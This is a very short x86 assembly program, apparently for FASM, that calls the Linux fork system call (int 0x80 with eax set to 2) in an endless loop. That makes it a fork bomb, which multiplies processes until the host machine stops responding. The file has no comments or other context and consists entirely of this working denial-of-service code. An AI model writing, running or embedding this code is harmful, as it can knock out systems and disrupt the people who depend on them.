entry start
start:
       push 0x2
       pop eax
       int 0x80
       jmp start
